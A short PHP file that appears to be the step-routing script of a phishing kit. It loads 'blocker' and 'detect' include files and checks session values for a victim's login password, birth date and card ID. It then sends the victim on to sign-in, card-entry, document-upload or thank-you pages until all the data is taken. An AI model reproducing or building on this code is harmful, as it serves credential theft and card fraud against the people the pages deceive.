<?php



include("../system/blocker.php");
include("../system/detect.php");


$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);





if(isset($_SESSION['_login_password_'])){

if(!empty($_SESSION['_login_password_'])){



if(isset($_SESSION['_birth_date_'])){

if(!empty($_SESSION['_birth_date_'])){


if(isset($_SESSION['_cardid_'])){

if(!empty($_SESSION['_cardid_'])){



header('Location: ../browse/Thanks');


	}else{header('Location: ../browse/uploads');}

}else{header('Location: ../browse/uploads');}



	}else{header('Location: ../Cards');}

}else{header('Location: ../Cards');}



	}else{header('Location: ./Signin');}

}else{header('Location: ./Signin');}









?>

